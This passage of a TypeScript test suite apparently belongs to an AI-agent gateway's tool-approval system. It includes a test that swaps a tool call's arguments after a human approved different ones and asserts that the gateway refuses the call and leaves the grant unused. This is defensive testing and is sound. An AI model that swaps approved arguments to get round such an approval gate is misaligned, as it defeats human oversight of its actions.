        delegationId, surfaceId: wrapperSurface, profileId: wrapperProfile,
        profileDelegationRevision: 1, profileSchemaVersion: 'torqclaw.effective-profile/v1',
        profileVersion: 1, toolRegistryVersion: 'torqclaw.tools/v1',
        effectiveProfilePolicyHash: wrapperPolicyHash, registryEnforcementHash: wrapperRegistryHash,
      });

      const APPROVED_ARGS_BS01 = { e2e: true, prompt: 'bs01 approved prompt' };
      const ATTACK_ARGS_BS01 = { e2e: true, prompt: 'bs01 SWAPPED prompt -- never approved' };

      /** Seed a real C2-bound approval + grant for a CHOSEN dispatchRequestId,
       *  bound to APPROVED_ARGS_BS01 -- the same low-level writer path the
       *  in-memory tests above use, pointed at the live dist db. */
      function seedGrant(dispatchRequestId: string, sourceRequestId: string): void {
        const canonicalArgs = validateAndCanonicalizeArgs(APPROVED_ARGS_BS01);
        const approvalId = randomUUID();
        const ctxInput = {
          originPrincipalId: wrapperPrincipal, originSurfaceId: wrapperSurface,
          sourceRequestId, originSurfaceKind: 'desktop', profileId: wrapperProfile,
          toolName: TOOL, canonicalArgs,
          privacyContextHash: privacyContextHash({ containsSensitiveData: false }),
          routingContextHash: routingContextHash({
            executionMode: 'AUTO', selectedTier: 'OLLAMA_LOCAL', ruleId: null,
          }),
          securityPolicyHash: securityPolicyHash({
            effectiveProfile: {
              schemaVersion: 'torqclaw.effective-profile/v1', profileId: wrapperProfile,
              profileVersion: 1, toolRegistryVersion: 'torqclaw.tools/v1',
              effectiveProfilePolicyHash: wrapperPolicyHash,
            },
            capabilityRevision: 1, profileDelegationRevision: 1,
            registryEnforcementHash: wrapperRegistryHash,
          }),
        };
        liveDb.prepare(
          `INSERT INTO tasks (request_id, session_id, tier, router_reason, state, request_json)
           VALUES (?, ?, 'LOCAL_EDGE', 'r', 'completed', '{}')`,
        ).run(sourceRequestId, sid);
        registerC2Approval(liveDb, {
          approvalId, requestId: sourceRequestId, toolName: TOOL, canonicalArgs,
          originPrincipalId: wrapperPrincipal, originSurfaceId: wrapperSurface, contextInput: ctxInput,
          binding: {
            delegationId, profileDelegationRevision: 1, registeredProfileId: wrapperProfile,
            registeredProfileVersion: 1, registeredToolRegistryVersion: 'torqclaw.tools/v1',
            registeredEffectiveProfilePolicyHash: wrapperPolicyHash, registeredCapabilityRevision: 1,
            registeredRegistryEnforcementHash: wrapperRegistryHash,
            registeredPrivacyContextHash: ctxInput.privacyContextHash,
            registeredRoutingContextHash: ctxInput.routingContextHash,
            registeredSecurityPolicyHash: ctxInput.securityPolicyHash,
          },
        });
        const decided = decideC2Approval(liveDb, {
          approvalId, decision: 'APPROVE', decidingPrincipalId: wrapperPrincipal,
          decidingSurfaceId: wrapperSurface, currentContext: ctxInput, dispatchRequestId,
          mintDispatchTask: (id: string) => {
            liveDb.prepare(
              `INSERT INTO tasks (request_id, session_id, tier, router_reason, state, request_json)
               VALUES (?, ?, 'LOCAL_EDGE', 'remint', 'running', '{}')`,
            ).run(id, sid);
          },
        });
        expect(decided, 'seedGrant: decideC2Approval must mint the grant').not.toBeNull();
      }

      function makeReq(dispatchRequestId: string, args: { prompt: string }) {
        return {
          id: dispatchRequestId,
          sessionId: sid,
          sourceChannel: 'test',
          receivedAt: new Date().toISOString(),
          payload: {
            prompt: args.prompt, assembledContext: '', contextSize: 0,
            requiredTools: [], taskType: 'general', grantedTools: [TOOL],
          },
          constraints: { latencySensitivity: 'LOW', containsSensitiveData: false, executionMode: 'LOCAL_ONLY' },
          enrichment: { memoryUsed: false },
        } as any;
      }
      const { ComputeTier: ComputeTierBs01 } = await import('@torqclaw/contracts');
      const diag = { score: 1, reason: 'bs01 test', tier: ComputeTierBs01.LOCAL_EDGE } as any;

      async function waitForTaskResult(requestId: string, timeoutMs = 15000): Promise<{ result: string | null; state: string }> {
        const deadline = Date.now() + timeoutMs;
        for (;;) {
          const row = liveDb.prepare('SELECT result, state FROM tasks WHERE request_id=?')
            .get(requestId) as { result: string | null; state: string } | undefined;
          if (row && row.state !== 'running') return row;
          if (Date.now() >= deadline) throw new Error('timed out waiting for task ' + requestId + '; last row=' + JSON.stringify(row));
          await new Promise((r) => setTimeout(r, 50));
        }
      }

      // ═══════════════════ ATTACK: mismatched args ═══════════════════
      const attackSourceId = randomUUID();
      const attackDispatchId = randomUUID();
      seedGrant(attackDispatchId, attackSourceId);
      const attackGrantBefore = liveDb.prepare(
        'SELECT consumed_at, revoked_at FROM gateway_action_grants WHERE dispatch_request_id=?',
      ).get(attackDispatchId) as { consumed_at: string | null; revoked_at: string | null };
      expect(attackGrantBefore.consumed_at).toBeNull();

      dispatch(makeReq(attackDispatchId, ATTACK_ARGS_BS01), diag);
      const attackResult = await waitForTaskResult(attackDispatchId);

      // ── THE LOAD-BEARING ASSERTIONS (attack) ──
      expect(attackResult.state, 'the attack dispatch must reach a terminal state').toBe('completed');
      expect(attackResult.result, 'the SHIPPED closure must refuse the mismatched args')
        .toContain('action-binding-mismatch');
      expect(attackResult.result, 'the tool must NOT report having executed')
        .not.toContain('[e2e] executed');
      const attackGrantAfter = liveDb.prepare(
        'SELECT consumed_at, revoked_at FROM gateway_action_grants WHERE dispatch_request_id=?',
      ).get(attackDispatchId) as { consumed_at: string | null; revoked_at: string | null };
      expect(attackGrantAfter.consumed_at, 'the attack must leave the grant UNCONSUMED (side-effect absence)').toBeNull();
      expect(attackGrantAfter.revoked_at).toBeNull();

      // ═══════════════════ POSITIVE CONTROL: matching args ═══════════════════
      const controlSourceId = randomUUID();
      const controlDispatchId = randomUUID();
      seedGrant(controlDispatchId, controlSourceId);

      dispatch(makeReq(controlDispatchId, APPROVED_ARGS_BS01), diag);
      const controlResult = await waitForTaskResult(controlDispatchId);

      // ── THE LOAD-BEARING ASSERTIONS (control) ──
      expect(controlResult.state, 'the control dispatch must reach a terminal state').toBe('completed');
      expect(controlResult.result, 'the SHIPPED closure MUST admit matching args and the tool MUST execute')
        .toContain('[e2e] executed');
      expect(controlResult.result).not.toContain('action-binding-mismatch');
      const controlGrantAfter = liveDb.prepare(
        'SELECT consumed_at, revoked_at FROM gateway_action_grants WHERE dispatch_request_id=?',
      ).get(controlDispatchId) as { consumed_at: string | null; revoked_at: string | null };
      expect(controlGrantAfter.consumed_at, 'the control run MUST consume its grant').not.toBeNull();
      expect(controlGrantAfter.revoked_at).toBeNull();

      resetStateDbForTest({ close: false });
    } finally {
      if (prevDir === undefined) delete process.env.TORQCLAW_DATA_DIR;
      else process.env.TORQCLAW_DATA_DIR = prevDir;
      if (prevFlag === undefined) delete process.env.TORQCLAW_COLLAB_ENABLED;
      else process.env.TORQCLAW_COLLAB_ENABLED = prevFlag;
      if (prevForce === undefined) delete process.env.TORQCLAW_E2E_FORCE_GATED_TOOL;
      else process.env.TORQCLAW_E2E_FORCE_GATED_TOOL = prevForce;
    }
  }, 120000);
});

describe('S0 B-1: the legacy D-3/SI-4 arm is preserved (no grant row => admitted)', () => {
  it('a dispatch request that never carries a grant (legacy connection) is still admitted, matching pre-S0 behaviour', () => {
    // This is the arm the task instructions require to survive UNCHANGED:
    // a legacy human-paced connection that never went through C2
    // registration has no grant row BY DESIGN, and must not be refused
    // grant-missing.
    const result = localEdgeAdmissionCheck('req-with-no-grant-row', TOOL, APPROVED_ARGS);
    expect(result.ok).toBe(true);
  });
});

describe('S0 B-7: boot recovery sweep is flag-independent', () => {
  const saved = process.env.TORQCLAW_COLLAB_ENABLED;
  beforeEach(() => { delete process.env.TORQCLAW_COLLAB_ENABLED; });
  afterEach(() => {
    if (saved === undefined) delete process.env.TORQCLAW_COLLAB_ENABLED;
    else process.env.TORQCLAW_COLLAB_ENABLED = saved;
  });

  it('POSITIVE CONTROL + refusal: revokeInertGrants revokes an inert grant with the flag UNSET, and the revoked grant is then refused', () => {
    expect(process.env.TORQCLAW_COLLAB_ENABLED).toBeUndefined();
    const { dispatchRequestId } = approvedGrant(APPROVED_ARGS);
    // Simulate the crash: the grant exists, unconsumed, unrevoked.
    const before = db.prepare(
      'SELECT consumed_at, revoked_at FROM gateway_action_grants WHERE dispatch_request_id=?',
    ).get(dispatchRequestId) as { consumed_at: string | null; revoked_at: string | null };
    expect(before.consumed_at).toBeNull();
    expect(before.revoked_at).toBeNull();

    const revokedCount = revokeInertGrants(db);
    expect(revokedCount, 'revokeInertGrants must find and revoke the inert grant with the flag unset').toBe(1);

    const after = db.prepare(
      'SELECT consumed_at, revoked_at FROM gateway_action_grants WHERE dispatch_request_id=?',
    ).get(dispatchRequestId) as { consumed_at: string | null; revoked_at: string | null };
    expect(after.revoked_at, 'the grant must actually be marked revoked').not.toBeNull();
    expect(after.consumed_at).toBeNull();

    // And the side effect that matters: the revoked grant can no longer be admitted.
    const attempt = localEdgeAdmissionCheck(dispatchRequestId, TOOL, APPROVED_ARGS);
    expect(attempt.ok).toBe(false);
    expect((attempt as { reason: string }).reason).toBe('grant-revoked');
  });

  it('sweepExpiredApprovals expires a stale pending approval with the flag UNSET', () => {
    const canonicalArgs = validateAndCanonicalizeArgs(APPROVED_ARGS);
    const approvalId = randomUUID();
    const ctx = makeContext(canonicalArgs);
    registerC2Approval(db, {
      approvalId, requestId: 'req-1', toolName: TOOL, canonicalArgs,
      originPrincipalId: PRINCIPAL, originSurfaceId: OP_SURFACE, contextInput: ctx,
      binding: {
        delegationId, profileDelegationRevision: 1, registeredProfileId: PROFILE,
        registeredProfileVersion: 1, registeredToolRegistryVersion: 'torqclaw.tools/v1',
        registeredEffectiveProfilePolicyHash: POLICY_HASH, registeredCapabilityRevision: 1,
        registeredRegistryEnforcementHash: REGISTRY_HASH,
        registeredPrivacyContextHash: ctx.privacyContextHash,
        registeredRoutingContextHash: ctx.routingContextHash,
        registeredSecurityPolicyHash: ctx.securityPolicyHash,
      },
    });
    db.prepare("UPDATE tool_approvals SET expires_at='2000-01-01 00:00:00.000' WHERE approval_id=?")
      .run(approvalId);
    const before = db.prepare('SELECT status FROM tool_approvals WHERE approval_id=?')
      .get(approvalId) as { status: string };
    expect(before.status).toBe('pending');

    const expiredCount = sweepExpiredApprovals(db);
    expect(expiredCount, 'sweepExpiredApprovals must find and expire the stale approval with the flag unset').toBe(1);

    const after = db.prepare('SELECT status FROM tool_approvals WHERE approval_id=?')
      .get(approvalId) as { status: string };
    expect(after.status).toBe('expired');
  });

  it('sweepExpiredGrants revokes a TTL-elapsed unconsumed grant with the flag UNSET', () => {
    const { dispatchRequestId } = approvedGrant(APPROVED_ARGS);
    db.prepare("UPDATE gateway_action_grants SET expires_at='2000-01-01 00:00:00.000' WHERE dispatch_request_id=?")
      .run(dispatchRequestId);
    const before = db.prepare('SELECT revoked_at FROM gateway_action_grants WHERE dispatch_request_id=?')
      .get(dispatchRequestId) as { revoked_at: string | null };
    expect(before.revoked_at).toBeNull();

    const revokedCount = sweepExpiredGrants(db);
    expect(revokedCount, 'sweepExpiredGrants must find and revoke the TTL-elapsed grant with the flag unset').toBe(1);

    const after = db.prepare('SELECT revoked_at FROM gateway_action_grants WHERE dispatch_request_id=?')
      .get(dispatchRequestId) as { revoked_at: string | null };
    expect(after.revoked_at).not.toBeNull();
  });

  it('STRUCTURAL: the three boot-recovery sweep calls in server.ts are not inside an `if (collabEnabled())` guard', () => {
    const src = readFileSync(SERVER_SRC, 'utf8');
    // Isolate the section from where boot recovery begins (right after
    // connectBridge()) up to and including the last of the three named
    // sweep calls -- NOT including the delivery-projection rebuild, which
    // is a SEPARATE, deliberately-still-gated block per the task scope
    // ("move ONLY the three sweep calls out; do not disturb the rest").
    const bootRecoveryStart = src.indexOf('await connectBridge();');
    expect(bootRecoveryStart, 'boot recovery section not found').toBeGreaterThan(-1);
    const lastSweepCallIdx = src.indexOf('sweepExpiredGrants(db);', bootRecoveryStart);
    expect(lastSweepCallIdx, 'sweepExpiredGrants boot call not found').toBeGreaterThan(-1);
    const recoverySection = src.slice(bootRecoveryStart, lastSweepCallIdx + 'sweepExpiredGrants(db);'.length);
    // Match only a REAL guard statement (the flag check immediately
    // followed by its opening brace), not the prose in the surrounding
    // comment that intentionally quotes the removed code shape.
    expect(recoverySection, 'S0 REGRESSION: the boot-recovery sweep calls are '
      + 'gated on collabEnabled() again -- a crashed gateway would leave '
      + 'inert grants unrevoked and stale approvals actionable by default')
      .not.toMatch(/if\s*\(collabEnabled\(\)\)\s*\{/);
    // And confirm the three calls are actually present in that section
    // (guards against the indexOf pair matching something unrelated).
    expect(recoverySection).toContain('revokeInertGrants(db)');
    expect(recoverySection).toContain('sweepExpiredApprovals(db)');
    expect(recoverySection).toContain('sweepExpiredGrants(db)');
  });
});
